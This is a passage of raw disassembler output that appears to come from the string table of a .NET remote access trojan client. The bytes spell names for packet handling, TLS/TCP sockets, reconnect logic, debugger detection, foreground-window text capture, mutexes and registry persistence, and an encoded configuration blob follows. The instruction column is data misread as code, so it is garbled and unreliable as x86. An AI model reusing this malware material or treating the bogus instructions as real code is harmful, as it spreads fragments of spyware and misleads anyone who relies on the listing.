  40915f:	6c                   	insb   (%dx),%es:(%edi)
  409160:	65 63 74 00 43       	arpl   %esi,%gs:0x43(%eax,%eax,1)
  409165:	6f                   	outsl  %ds:(%esi),(%dx)
  409166:	6e                   	outsb  %ds:(%esi),(%dx)
  409167:	6e                   	outsb  %ds:(%esi),(%dx)
  409168:	65 63 74 00 52       	arpl   %esi,%gs:0x52(%eax,%eax,1)
  40916d:	65 63 6f 6e          	arpl   %ebp,%gs:0x6e(%edi)
  409171:	6e                   	outsb  %ds:(%esi),(%dx)
  409172:	65 63 74 00 47       	arpl   %esi,%gs:0x47(%eax,%eax,1)
  409177:	65 74 00             	gs je  0x40917a
  40917a:	53                   	push   %ebx
  40917b:	79 73                	jns    0x4091f0
  40917d:	74 65                	je     0x4091e4
  40917f:	6d                   	insl   (%dx),%es:(%edi)
  409180:	2e 4e                	cs dec %esi
  409182:	65 74 00             	gs je  0x409185
  409185:	53                   	push   %ebx
  409186:	65 74 00             	gs je  0x409189
  409189:	54                   	push   %esp
  40918a:	61                   	popa
  40918b:	72 67                	jb     0x4091f4
  40918d:	65 74 00             	gs je  0x409190
  409190:	43                   	inc    %ebx
  409191:	6c                   	insb   (%dx),%es:(%edi)
  409192:	69 65 6e 74 2e 48 61 	imul   $0x61482e74,0x6e(%ebp),%esp
  409199:	6e                   	outsb  %ds:(%esi),(%dx)
  40919a:	64 6c                	fs insb (%dx),%es:(%edi)
  40919c:	65 5f                	gs pop %edi
  40919e:	50                   	push   %eax
  40919f:	61                   	popa
  4091a0:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4091a3:	74 00                	je     0x4091a5
  4091a5:	4b                   	dec    %ebx
  4091a6:	65 65 70 41          	gs gs jo 0x4091eb
  4091aa:	6c                   	insb   (%dx),%es:(%edi)
  4091ab:	69 76 65 50 61 63 6b 	imul   $0x6b636150,0x65(%esi),%esi
  4091b2:	65 74 00             	gs je  0x4091b5
  4091b5:	43                   	inc    %ebx
  4091b6:	6c                   	insb   (%dx),%es:(%edi)
  4091b7:	69 65 6e 74 53 6f 63 	imul   $0x636f5374,0x6e(%ebp),%esp
  4091be:	6b 65 74 00          	imul   $0x0,0x74(%ebp),%esp
  4091c2:	53                   	push   %ebx
  4091c3:	79 73                	jns    0x409238
  4091c5:	74 65                	je     0x40922c
  4091c7:	6d                   	insl   (%dx),%es:(%edi)
  4091c8:	2e 43                	cs inc %ebx
  4091ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4091cb:	6c                   	insb   (%dx),%es:(%edi)
  4091cc:	6c                   	insb   (%dx),%es:(%edi)
  4091cd:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4091d2:	6e                   	outsb  %ds:(%esi),(%dx)
  4091d3:	73 2e                	jae    0x409203
  4091d5:	49                   	dec    %ecx
  4091d6:	45                   	inc    %ebp
  4091d7:	6e                   	outsb  %ds:(%esi),(%dx)
  4091d8:	75 6d                	jne    0x409247
  4091da:	65 72 61             	gs jb  0x40923e
  4091dd:	74 6f                	je     0x40924e
  4091df:	72 2e                	jb     0x40920f
  4091e1:	52                   	push   %edx
  4091e2:	65 73 65             	gs jae 0x40924a
  4091e5:	74 00                	je     0x4091e7
  4091e7:	67 65 74 5f          	addr16 gs je 0x40924a
  4091eb:	4f                   	dec    %edi
  4091ec:	66 66 73 65          	data16 data16 jae 0x409255
  4091f0:	74 00                	je     0x4091f2
  4091f2:	73 65                	jae    0x409259
  4091f4:	74 5f                	je     0x409255
  4091f6:	4f                   	dec    %edi
  4091f7:	66 66 73 65          	data16 data16 jae 0x409260
  4091fb:	74 00                	je     0x4091fd
  4091fd:	53                   	push   %ebx
  4091fe:	70 6c                	jo     0x40926c
  409200:	69 74 00 43 6c 69 65 	imul   $0x6e65696c,0x43(%eax,%eax,1),%esi
  409207:	6e 
  409208:	74 4f                	je     0x409259
  40920a:	6e                   	outsb  %ds:(%esi),(%dx)
  40920b:	45                   	inc    %ebp
  40920c:	78 69                	js     0x409277
  40920e:	74 00                	je     0x409210
  409210:	53                   	push   %ebx
  409211:	61                   	popa
  409212:	6c                   	insb   (%dx),%es:(%edi)
  409213:	74 00                	je     0x409215
  409215:	49                   	dec    %ecx
  409216:	41                   	inc    %ecx
  409217:	73 79                	jae    0x409292
  409219:	6e                   	outsb  %ds:(%esi),(%dx)
  40921a:	63 52 65             	arpl   %edx,0x65(%edx)
  40921d:	73 75                	jae    0x409294
  40921f:	6c                   	insb   (%dx),%es:(%edi)
  409220:	74 00                	je     0x409222
  409222:	54                   	push   %esp
  409223:	6f                   	outsl  %ds:(%esi),(%dx)
  409224:	55                   	push   %ebp
  409225:	70 70                	jo     0x409297
  409227:	65 72 49             	gs jb  0x409273
  40922a:	6e                   	outsb  %ds:(%esi),(%dx)
  40922b:	76 61                	jbe    0x40928e
  40922d:	72 69                	jb     0x409298
  40922f:	61                   	popa
  409230:	6e                   	outsb  %ds:(%esi),(%dx)
  409231:	74 00                	je     0x409233
  409233:	57                   	push   %edi
  409234:	65 62 43 6c          	bound  %eax,%gs:0x6c(%ebx)
  409238:	69 65 6e 74 00 49 6e 	imul   $0x6e490074,0x6e(%ebp),%esp
  40923f:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  409246:	65 
  409247:	43                   	inc    %ebx
  409248:	6c                   	insb   (%dx),%es:(%edi)
  409249:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  409250:	74 5f                	je     0x4092b1
  409252:	53                   	push   %ebx
  409253:	73 6c                	jae    0x4092c1
  409255:	43                   	inc    %ebx
  409256:	6c                   	insb   (%dx),%es:(%edi)
  409257:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  40925e:	74 5f                	je     0x4092bf
  409260:	53                   	push   %ebx
  409261:	73 6c                	jae    0x4092cf
  409263:	43                   	inc    %ebx
  409264:	6c                   	insb   (%dx),%es:(%edi)
  409265:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  40926c:	74 5f                	je     0x4092cd
  40926e:	54                   	push   %esp
  40926f:	63 70 43             	arpl   %esi,0x43(%eax)
  409272:	6c                   	insb   (%dx),%es:(%edi)
  409273:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  40927a:	74 5f                	je     0x4092db
  40927c:	54                   	push   %esp
  40927d:	63 70 43             	arpl   %esi,0x43(%eax)
  409280:	6c                   	insb   (%dx),%es:(%edi)
  409281:	69 65 6e 74 00 41 75 	imul   $0x75410074,0x6e(%ebp),%esp
  409288:	74 68                	je     0x4092f2
  40928a:	65 6e                	outsb  %gs:(%esi),(%dx)
  40928c:	74 69                	je     0x4092f7
  40928e:	63 61 74             	arpl   %esp,0x74(%ecx)
  409291:	65 41                	gs inc %ecx
  409293:	73 43                	jae    0x4092d8
  409295:	6c                   	insb   (%dx),%es:(%edi)
  409296:	69 65 6e 74 00 53 79 	imul   $0x79530074,0x6e(%ebp),%esp
  40929d:	73 74                	jae    0x409313
  40929f:	65 6d                	gs insl (%dx),%es:(%edi)
  4092a1:	2e 4d                	cs dec %ebp
  4092a3:	61                   	popa
  4092a4:	6e                   	outsb  %ds:(%esi),(%dx)
  4092a5:	61                   	popa
  4092a6:	67 65 6d             	gs insl (%dx),%es:(%di)
  4092a9:	65 6e                	outsb  %gs:(%esi),(%dx)
  4092ab:	74 00                	je     0x4092ad
  4092ad:	45                   	inc    %ebp
  4092ae:	6e                   	outsb  %ds:(%esi),(%dx)
  4092af:	76 69                	jbe    0x40931a
  4092b1:	72 6f                	jb     0x409322
  4092b3:	6e                   	outsb  %ds:(%esi),(%dx)
  4092b4:	6d                   	insl   (%dx),%es:(%edi)
  4092b5:	65 6e                	outsb  %gs:(%esi),(%dx)
  4092b7:	74 00                	je     0x4092b9
  4092b9:	70 61                	jo     0x40931c
  4092bb:	72 65                	jb     0x409322
  4092bd:	6e                   	outsb  %ds:(%esi),(%dx)
  4092be:	74 00                	je     0x4092c0
  4092c0:	53                   	push   %ebx
  4092c1:	79 73                	jns    0x409336
  4092c3:	74 65                	je     0x40932a
  4092c5:	6d                   	insl   (%dx),%es:(%edi)
  4092c6:	2e 43                	cs inc %ebx
  4092c8:	6f                   	outsl  %ds:(%esi),(%dx)
  4092c9:	6c                   	insb   (%dx),%es:(%edi)
  4092ca:	6c                   	insb   (%dx),%es:(%edi)
  4092cb:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4092d0:	6e                   	outsb  %ds:(%esi),(%dx)
  4092d1:	73 2e                	jae    0x409301
  4092d3:	49                   	dec    %ecx
  4092d4:	45                   	inc    %ebp
  4092d5:	6e                   	outsb  %ds:(%esi),(%dx)
  4092d6:	75 6d                	jne    0x409345
  4092d8:	65 72 61             	gs jb  0x40933c
  4092db:	74 6f                	je     0x40934c
  4092dd:	72 2e                	jb     0x40930d
  4092df:	43                   	inc    %ebx
  4092e0:	75 72                	jne    0x409354
  4092e2:	72 65                	jb     0x409349
  4092e4:	6e                   	outsb  %ds:(%esi),(%dx)
  4092e5:	74 00                	je     0x4092e7
  4092e7:	53                   	push   %ebx
  4092e8:	79 73                	jns    0x40935d
  4092ea:	74 65                	je     0x409351
  4092ec:	6d                   	insl   (%dx),%es:(%edi)
  4092ed:	2e 43                	cs inc %ebx
  4092ef:	6f                   	outsl  %ds:(%esi),(%dx)
  4092f0:	6c                   	insb   (%dx),%es:(%edi)
  4092f1:	6c                   	insb   (%dx),%es:(%edi)
  4092f2:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4092f7:	6e                   	outsb  %ds:(%esi),(%dx)
  4092f8:	73 2e                	jae    0x409328
  4092fa:	49                   	dec    %ecx
  4092fb:	45                   	inc    %ebp
  4092fc:	6e                   	outsb  %ds:(%esi),(%dx)
  4092fd:	75 6d                	jne    0x40936c
  4092ff:	65 72 61             	gs jb  0x409363
  409302:	74 6f                	je     0x409373
  409304:	72 2e                	jb     0x409334
  409306:	67 65 74 5f          	addr16 gs je 0x409369
  40930a:	43                   	inc    %ebx
  40930b:	75 72                	jne    0x40937f
  40930d:	72 65                	jb     0x409374
  40930f:	6e                   	outsb  %ds:(%esi),(%dx)
  409310:	74 00                	je     0x409312
  409312:	47                   	inc    %edi
  409313:	65 74 43             	gs je  0x409359
  409316:	75 72                	jne    0x40938a
  409318:	72 65                	jb     0x40937f
  40931a:	6e                   	outsb  %ds:(%esi),(%dx)
  40931b:	74 00                	je     0x40931d
  40931d:	43                   	inc    %ebx
  40931e:	68 65 63 6b 52       	push   $0x526b6365
  409323:	65 6d                	gs insl (%dx),%es:(%edi)
  409325:	6f                   	outsl  %ds:(%esi),(%dx)
  409326:	74 65                	je     0x40938d
  409328:	44                   	inc    %esp
  409329:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  40932d:	67 65 72 50          	addr16 gs jb 0x409381
  409331:	72 65                	jb     0x409398
  409333:	73 65                	jae    0x40939a
  409335:	6e                   	outsb  %ds:(%esi),(%dx)
  409336:	74 00                	je     0x409338
  409338:	69 73 44 65 62 75 67 	imul   $0x67756265,0x44(%ebx),%esi
  40933f:	67 65 72 50          	addr16 gs jb 0x409393
  409343:	72 65                	jb     0x4093aa
  409345:	73 65                	jae    0x4093ac
  409347:	6e                   	outsb  %ds:(%esi),(%dx)
  409348:	74 00                	je     0x40934a
  40934a:	67 65 74 5f          	addr16 gs je 0x4093ad
  40934e:	52                   	push   %edx
  40934f:	65 6d                	gs insl (%dx),%es:(%edi)
  409351:	6f                   	outsl  %ds:(%esi),(%dx)
  409352:	74 65                	je     0x4093b9
  409354:	45                   	inc    %ebp
  409355:	6e                   	outsb  %ds:(%esi),(%dx)
  409356:	64 50                	fs push %eax
  409358:	6f                   	outsl  %ds:(%esi),(%dx)
  409359:	69 6e 74 00 67 65 74 	imul   $0x74656700,0x74(%esi),%ebp
  409360:	5f                   	pop    %edi
  409361:	43                   	inc    %ebx
  409362:	6f                   	outsl  %ds:(%esi),(%dx)
  409363:	75 6e                	jne    0x4093d3
  409365:	74 00                	je     0x409367
  409367:	67 65 74 5f          	addr16 gs je 0x4093ca
  40936b:	50                   	push   %eax
  40936c:	72 6f                	jb     0x4093dd
  40936e:	63 65 73             	arpl   %esp,0x73(%ebp)
  409371:	73 6f                	jae    0x4093e2
  409373:	72 43                	jb     0x4093b8
  409375:	6f                   	outsl  %ds:(%esi),(%dx)
  409376:	75 6e                	jne    0x4093e6
  409378:	74 00                	je     0x40937a
  40937a:	63 6f 75             	arpl   %ebp,0x75(%edi)
  40937d:	6e                   	outsb  %ds:(%esi),(%dx)
  40937e:	74 00                	je     0x409380
  409380:	47                   	inc    %edi
  409381:	65 74 50             	gs je  0x4093d4
  409384:	61                   	popa
  409385:	74 68                	je     0x4093ef
  409387:	52                   	push   %edx
  409388:	6f                   	outsl  %ds:(%esi),(%dx)
  409389:	6f                   	outsl  %ds:(%esi),(%dx)
  40938a:	74 00                	je     0x40938c
  40938c:	44                   	inc    %esp
  40938d:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  409391:	70 74                	jo     0x409407
  409393:	00 45 6e             	add    %al,0x6e(%ebp)
  409396:	63 72 79             	arpl   %esi,0x79(%edx)
  409399:	70 74                	jo     0x40940f
  40939b:	00 50 61             	add    %dl,0x61(%eax)
  40939e:	72 61                	jb     0x409401
  4093a0:	6d                   	insl   (%dx),%es:(%edi)
  4093a1:	65 74 65             	gs je  0x409409
  4093a4:	72 69                	jb     0x40940f
  4093a6:	7a 65                	jp     0x40940d
  4093a8:	64 54                	fs push %esp
  4093aa:	68 72 65 61 64       	push   $0x64616572
  4093af:	53                   	push   %ebx
  4093b0:	74 61                	je     0x409413
  4093b2:	72 74                	jb     0x409428
  4093b4:	00 43 6f             	add    %al,0x6f(%ebx)
  4093b7:	6e                   	outsb  %ds:(%esi),(%dx)
  4093b8:	76 65                	jbe    0x40941f
  4093ba:	72 74                	jb     0x409430
  4093bc:	00 46 61             	add    %al,0x61(%esi)
  4093bf:	69 6c 46 61 73 74 00 	imul   $0x54007473,0x61(%esi,%eax,2),%ebp
  4093c6:	54 
  4093c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4093c8:	4c                   	dec    %esp
  4093c9:	69 73 74 00 69 6e 70 	imul   $0x706e6900,0x74(%ebx),%esi
  4093d0:	75 74                	jne    0x409446
  4093d2:	00 53 79             	add    %dl,0x79(%ebx)
  4093d5:	73 74                	jae    0x40944b
  4093d7:	65 6d                	gs insl (%dx),%es:(%edi)
  4093d9:	2e 43                	cs inc %ebx
  4093db:	6f                   	outsl  %ds:(%esi),(%dx)
  4093dc:	6c                   	insb   (%dx),%es:(%edi)
  4093dd:	6c                   	insb   (%dx),%es:(%edi)
  4093de:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4093e3:	6e                   	outsb  %ds:(%esi),(%dx)
  4093e4:	73 2e                	jae    0x409414
  4093e6:	49                   	dec    %ecx
  4093e7:	45                   	inc    %ebp
  4093e8:	6e                   	outsb  %ds:(%esi),(%dx)
  4093e9:	75 6d                	jne    0x409458
  4093eb:	65 72 61             	gs jb  0x40944f
  4093ee:	74 6f                	je     0x40945f
  4093f0:	72 2e                	jb     0x409420
  4093f2:	4d                   	dec    %ebp
  4093f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4093f4:	76 65                	jbe    0x40945b
  4093f6:	4e                   	dec    %esi
  4093f7:	65 78 74             	gs js  0x40946e
  4093fa:	00 53 79             	add    %dl,0x79(%ebx)
  4093fd:	73 74                	jae    0x409473
  4093ff:	65 6d                	gs insl (%dx),%es:(%edi)
  409401:	2e 54                	cs push %esp
  409403:	65 78 74             	gs js  0x40947a
  409406:	00 47 65             	add    %al,0x65(%edi)
  409409:	74 57                	je     0x409462
  40940b:	69 6e 64 6f 77 54 65 	imul   $0x6554776f,0x64(%esi),%ebp
  409412:	78 74                	js     0x409488
  409414:	00 74 65 78          	add    %dh,0x78(%ebp,%eiz,2)
  409418:	74 00                	je     0x40941a
  40941a:	76 00                	jbe    0x40941c
  40941c:	47                   	inc    %edi
  40941d:	65 74 46             	gs je  0x409466
  409420:	6f                   	outsl  %ds:(%esi),(%dx)
  409421:	72 65                	jb     0x409488
  409423:	67 72 6f             	addr16 jb 0x409495
  409426:	75 6e                	jne    0x409496
  409428:	64 57                	fs push %edi
  40942a:	69 6e 64 6f 77 00 73 	imul   $0x7300776f,0x64(%esi),%ebp
  409431:	65 74 5f             	gs je  0x409493
  409434:	43                   	inc    %ebx
  409435:	72 65                	jb     0x40949c
  409437:	61                   	popa
  409438:	74 65                	je     0x40949f
  40943a:	4e                   	dec    %esi
  40943b:	6f                   	outsl  %ds:(%esi),(%dx)
  40943c:	57                   	push   %edi
  40943d:	69 6e 64 6f 77 00 69 	imul   $0x6900776f,0x64(%esi),%ebp
  409444:	6e                   	outsb  %ds:(%esi),(%dx)
  409445:	64 65 78 00          	fs gs js 0x409449
  409449:	43                   	inc    %ebx
  40944a:	6c                   	insb   (%dx),%es:(%edi)
  40944b:	6f                   	outsl  %ds:(%esi),(%dx)
  40944c:	73 65                	jae    0x4094b3
  40944e:	4d                   	dec    %ebp
  40944f:	75 74                	jne    0x4094c5
  409451:	65 78 00             	gs js  0x409454
  409454:	43                   	inc    %ebx
  409455:	72 65                	jb     0x4094bc
  409457:	61                   	popa
  409458:	74 65                	je     0x4094bf
  40945a:	4d                   	dec    %ebp
  40945b:	75 74                	jne    0x4094d1
  40945d:	65 78 00             	gs js  0x409460
  409460:	44                   	inc    %esp
  409461:	65 6c                	gs insb (%dx),%es:(%edi)
  409463:	61                   	popa
  409464:	79 00                	jns    0x409466
  409466:	57                   	push   %edi
  409467:	69 72 74 65 41 72 72 	imul   $0x72724165,0x74(%edx),%esi
  40946e:	61                   	popa
  40946f:	79 00                	jns    0x409471
  409471:	49                   	dec    %ecx
  409472:	6e                   	outsb  %ds:(%esi),(%dx)
  409473:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  40947a:	65 
  40947b:	41                   	inc    %ecx
  40947c:	72 72                	jb     0x4094f0
  40947e:	61                   	popa
  40947f:	79 00                	jns    0x409481
  409481:	4d                   	dec    %ebp
  409482:	73 67                	jae    0x4094eb
  409484:	50                   	push   %eax
  409485:	61                   	popa
  409486:	63 6b 41             	arpl   %ebp,0x41(%ebx)
  409489:	72 72                	jb     0x4094fd
  40948b:	61                   	popa
  40948c:	79 00                	jns    0x40948e
  40948e:	54                   	push   %esp
  40948f:	6f                   	outsl  %ds:(%esi),(%dx)
  409490:	41                   	inc    %ecx
  409491:	72 72                	jb     0x409505
  409493:	61                   	popa
  409494:	79 00                	jns    0x409496
  409496:	67 65 74 5f          	addr16 gs je 0x4094f9
  40949a:	41                   	inc    %ecx
  40949b:	73 41                	jae    0x4094de
  40949d:	72 72                	jb     0x409511
  40949f:	61                   	popa
  4094a0:	79 00                	jns    0x4094a2
  4094a2:	72 65                	jb     0x409509
  4094a4:	66 41                	inc    %cx
  4094a6:	73 41                	jae    0x4094e9
  4094a8:	72 72                	jb     0x40951c
  4094aa:	61                   	popa
  4094ab:	79 00                	jns    0x4094ad
  4094ad:	67 65 74 5f          	addr16 gs je 0x409510
  4094b1:	4b                   	dec    %ebx
  4094b2:	65 79 00             	gs jns 0x4094b5
  4094b5:	73 65                	jae    0x40951c
  4094b7:	74 5f                	je     0x409518
  4094b9:	4b                   	dec    %ebx
  4094ba:	65 79 00             	gs jns 0x4094bd
  4094bd:	43                   	inc    %ebx
  4094be:	72 65                	jb     0x409525
  4094c0:	61                   	popa
  4094c1:	74 65                	je     0x409528
  4094c3:	53                   	push   %ebx
  4094c4:	75 62                	jne    0x409528
  4094c6:	4b                   	dec    %ebx
  4094c7:	65 79 00             	gs jns 0x4094ca
  4094ca:	44                   	inc    %esp
  4094cb:	65 6c                	gs insb (%dx),%es:(%edi)
  4094cd:	65 74 65             	gs je  0x409535
  4094d0:	53                   	push   %ebx
  4094d1:	75 62                	jne    0x409535
  4094d3:	4b                   	dec    %ebx
  4094d4:	65 79 00             	gs jns 0x4094d7
  4094d7:	4f                   	dec    %edi
  4094d8:	70 65                	jo     0x40953f
  4094da:	6e                   	outsb  %ds:(%esi),(%dx)
  4094db:	53                   	push   %ebx
  4094dc:	75 62                	jne    0x409540
  4094de:	4b                   	dec    %ebx
  4094df:	65 79 00             	gs jns 0x4094e2
  4094e2:	67 65 74 5f          	addr16 gs je 0x409545
  4094e6:	50                   	push   %eax
  4094e7:	75 62                	jne    0x40954b
  4094e9:	6c                   	insb   (%dx),%es:(%edi)
  4094ea:	69 63 4b 65 79 00 5f 	imul   $0x5f007965,0x4b(%ebx),%esp
  4094f1:	61                   	popa
  4094f2:	75 74                	jne    0x409568
  4094f4:	68 4b 65 79 00       	push   $0x79654b
  4094f9:	6d                   	insl   (%dx),%es:(%edi)
  4094fa:	61                   	popa
  4094fb:	73 74                	jae    0x409571
  4094fd:	65 72 4b             	gs jb  0x40954b
  409500:	65 79 00             	gs jns 0x409503
  409503:	52                   	push   %edx
  409504:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  40950b:	4b 65 
  40950d:	79 00                	jns    0x40950f
  40950f:	5f                   	pop    %edi
  409510:	6b 65 79 00          	imul   $0x0,0x79(%ebp),%esp
  409514:	53                   	push   %ebx
  409515:	79 73                	jns    0x40958a
  409517:	74 65                	je     0x40957e
  409519:	6d                   	insl   (%dx),%es:(%edi)
  40951a:	2e 53                	cs push %ebx
  40951c:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409520:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  409527:	70 
  409528:	74 6f                	je     0x409599
  40952a:	67 72 61             	addr16 jb 0x40958e
  40952d:	70 68                	jo     0x409597
  40952f:	79 00                	jns    0x409531
  409531:	41                   	inc    %ecx
  409532:	73 73                	jae    0x4095a7
  409534:	65 6d                	gs insl (%dx),%es:(%edi)
  409536:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  40953a:	41                   	inc    %ecx
  40953b:	64 64 72 65          	fs fs jb 0x4095a4
  40953f:	73 73                	jae    0x4095b4
  409541:	46                   	inc    %esi
  409542:	61                   	popa
  409543:	6d                   	insl   (%dx),%es:(%edi)
  409544:	69 6c 79 00 42 6c 6f 	imul   $0x636f6c42,0x0(%ecx,%edi,2),%ebp
  40954b:	63 
  40954c:	6b 43 6f 70          	imul   $0x70,0x6f(%ebx),%eax
  409550:	79 00                	jns    0x409552
  409552:	57                   	push   %edi
  409553:	72 69                	jb     0x4095be
  409555:	74 65                	je     0x4095bc
  409557:	42                   	inc    %edx
  409558:	69 6e 61 72 79 00 54 	imul   $0x54007972,0x61(%esi),%ebp
  40955f:	6f                   	outsl  %ds:(%esi),(%dx)
  409560:	42                   	inc    %edx
  409561:	69 6e 61 72 79 00 67 	imul   $0x67007972,0x61(%esi),%ebp
  409568:	65 74 5f             	gs je  0x4095ca
  40956b:	53                   	push   %ebx
  40956c:	79 73                	jns    0x4095e1
  40956e:	74 65                	je     0x4095d5
  409570:	6d                   	insl   (%dx),%es:(%edi)
  409571:	44                   	inc    %esp
  409572:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  409579:	79 00                	jns    0x40957b
  40957b:	53                   	push   %ebx
  40957c:	65 74 52             	gs je  0x4095d1
  40957f:	65 67 69 73 74 72 79 	imul   $0x6f007972,%gs:0x74(%bp,%di),%esi
  409586:	00 6f 
  409588:	70 5f                	jo     0x4095e9
  40958a:	45                   	inc    %ebp
  40958b:	71 75                	jno    0x409602
  40958d:	61                   	popa
  40958e:	6c                   	insb   (%dx),%es:(%edi)
  40958f:	69 74 79 00 6f 70 5f 	imul   $0x495f706f,0x0(%ecx,%edi,2),%esi
  409596:	49 
  409597:	6e                   	outsb  %ds:(%esi),(%dx)
  409598:	65 71 75             	gs jno 0x409610
  40959b:	61                   	popa
  40959c:	6c                   	insb   (%dx),%es:(%edi)
  40959d:	69 74 79 00 53 79 73 	imul   $0x74737953,0x0(%ecx,%edi,2),%esi
  4095a4:	74 
  4095a5:	65 6d                	gs insl (%dx),%es:(%edi)
  4095a7:	2e 4e                	cs dec %esi
  4095a9:	65 74 2e             	gs je  0x4095da
  4095ac:	53                   	push   %ebx
  4095ad:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4095b1:	69 74 79 00 57 69 6e 	imul   $0x646e6957,0x0(%ecx,%edi,2),%esi
  4095b8:	64 
  4095b9:	6f                   	outsl  %ds:(%esi),(%dx)
  4095ba:	77 73                	ja     0x40962f
  4095bc:	49                   	dec    %ecx
  4095bd:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  4095c0:	74 69                	je     0x40962b
  4095c2:	74 79                	je     0x40963d
  4095c4:	00 49 73             	add    %cl,0x73(%ecx)
  4095c7:	4e                   	dec    %esi
  4095c8:	75 6c                	jne    0x409636
  4095ca:	6c                   	insb   (%dx),%es:(%edi)
  4095cb:	4f                   	dec    %edi
  4095cc:	72 45                	jb     0x409613
  4095ce:	6d                   	insl   (%dx),%es:(%edi)
  4095cf:	70 74                	jo     0x409645
  4095d1:	79 00                	jns    0x4095d3
  4095d3:	00 00                	add    %al,(%eax)
  4095d5:	0d 53 00 48 00       	or     $0x480053,%eax
  4095da:	41                   	inc    %ecx
  4095db:	00 32                	add    %dh,(%edx)
  4095dd:	00 35 00 36 00 00    	add    %dh,0x3600
  4095e3:	81 01 62 00 72 00    	addl   $0x720062,(%ecx)
  4095e9:	4d                   	dec    %ebp
  4095ea:	00 51 00             	add    %dl,0x0(%ecx)
  4095ed:	4a                   	dec    %edx
  4095ee:	00 70 00             	add    %dh,0x0(%eax)
  4095f1:	57                   	push   %edi
  4095f2:	00 4d 00             	add    %cl,0x0(%ebp)
  4095f5:	66 00 44 00 5a       	data16 add %al,0x5a(%eax,%eax,1)
  4095fa:	00 32                	add    %dh,(%edx)
  4095fc:	00 35 00 68 00 42    	add    %dh,0x42006800
  409602:	00 50 00             	add    %dl,0x0(%eax)
  409605:	47                   	inc    %edi
  409606:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  40960a:	00 2b                	add    %ch,(%ebx)
  40960c:	00 37                	add    %dh,(%edi)
  40960e:	00 79 00             	add    %bh,0x0(%ecx)
  409611:	52                   	push   %edx
  409612:	00 6a 00             	add    %ch,0x0(%edx)
  409615:	4f                   	dec    %edi
  409616:	00 76 00             	add    %dh,0x0(%esi)
  409619:	6c                   	insb   (%dx),%es:(%edi)
  40961a:	00 43 00             	add    %al,0x0(%ebx)
  40961d:	2b 00                	sub    (%eax),%eax
  40961f:	61                   	popa
  409620:	00 58 00             	add    %bl,0x0(%eax)
  409623:	57                   	push   %edi
  409624:	00 70 00             	add    %dh,0x0(%eax)
  409627:	57                   	push   %edi
  409628:	00 2b                	add    %ch,(%ebx)
  40962a:	00 5a 00             	add    %bl,0x0(%edx)
  40962d:	54                   	push   %esp
  40962e:	00 53 00             	add    %dl,0x0(%ebx)
  409631:	70 00                	jo     0x409633
  409633:	5a                   	pop    %edx
  409634:	00 47 00             	add    %al,0x0(%edi)
  409637:	54                   	push   %esp
  409638:	00 7a 00             	add    %bh,0x0(%edx)
  40963b:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  40963f:	6f                   	outsl  %ds:(%esi),(%dx)
  409640:	00 61 00             	add    %ah,0x0(%ecx)
  409643:	36 00 41 00          	add    %al,%ss:0x0(%ecx)
  409647:	56                   	push   %esi
  409648:	00 56 00             	add    %dl,0x0(%esi)
  40964b:	39 00                	cmp    %eax,(%eax)
  40964d:	5a                   	pop    %edx
  40964e:	00 38                	add    %bh,(%eax)
  409650:	00 30                	add    %dh,(%eax)
  409652:	00 76 00             	add    %dh,0x0(%esi)
  409655:	36 00 6d 00          	add    %ch,%ss:0x0(%ebp)
  409659:	78 00                	js     0x40965b
  40965b:	76 00                	jbe    0x40965d
  40965d:	53                   	push   %ebx
  40965e:	00 39                	add    %bh,(%ecx)
  409660:	00 55 00             	add    %dl,0x0(%ebp)
  409663:	36 00 5a 00          	add    %bl,%ss:0x0(%edx)
  409667:	67 00 70 00          	add    %dh,0x0(%bx,%si)
  40966b:	30 00                	xor    %al,(%eax)
  40966d:	56                   	push   %esi
  40966e:	00 35 00 35 00 4d    	add    %dh,0x4d003500
  409674:	00 42 00             	add    %al,0x0(%edx)
  409677:	56                   	push   %esi
  409678:	00 78 00             	add    %bh,0x0(%eax)
  40967b:	56                   	push   %esi
  40967c:	00 34 00             	add    %dh,(%eax,%eax,1)
  40967f:	6a 00                	push   $0x0
  409681:	6a 00                	push   $0x0
  409683:	4a                   	dec    %edx
  409684:	00 38                	add    %bh,(%eax)
  409686:	00 43 00             	add    %al,0x0(%ebx)
  409689:	32 00                	xor    (%eax),%al
  40968b:	4f                   	dec    %edi
  40968c:	00 49 00             	add    %cl,0x0(%ecx)
  40968f:	42                   	inc    %edx
  409690:	00 73 00             	add    %dh,0x0(%ebx)
  409693:	45                   	inc    %ebp
  409694:	00 56 00             	add    %dl,0x0(%esi)
  409697:	34 00                	xor    $0x0,%al
  409699:	58                   	pop    %eax
  40969a:	00 34 00             	add    %dh,(%eax,%eax,1)
  40969d:	6f                   	outsl  %ds:(%esi),(%dx)
  40969e:	00 78 00             	add    %bh,0x0(%eax)
  4096a1:	4d                   	dec    %ebp
  4096a2:	00 67 00             	add    %ah,0x0(%edi)
  4096a5:	73 00                	jae    0x4096a7
